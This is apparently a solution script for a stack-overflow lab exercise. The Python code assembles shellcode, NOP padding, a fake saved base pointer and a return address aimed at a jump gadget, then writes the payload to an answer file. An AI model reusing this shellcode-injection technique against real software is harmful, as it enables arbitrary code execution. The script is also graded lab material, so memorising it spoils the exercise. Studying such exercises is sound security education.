# -*- coding: gbk -*-
# 利用思路：把shellcode放在[rbp-0x20]，ret跳到 jmp_xs(0x401334)，由其跳到shellcode执行
# shellcode: mov edi,0x72 ; mov rax,0x401216 ; jmp rax
shellcode= (
    b"\xBF\x72\x00\x00\x00"                                  # mov edi, 0x72
    b"\x48\xB8\x16\x12\x40\x00\x00\x00\x00\x00"              # movabs rax, 0x401216
    b"\xFF\xE0")                                             # jmp rax
padding= b"\x90" *15                                         # NOP 填充到 0x20 字节
fake_rbp = b"\x00\x00\x00\x00\x00\x00\x00\x00"               # 任意8字节
ret_to_jmp_xs = b"\x34\x13\x40\x00\x00\x00\x00\x00"         # 实为 jmp_xs@0x401334

payload = shellcode + padding + fake_rbp + ret_to_jmp_xs
# Write the payload to a file
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")
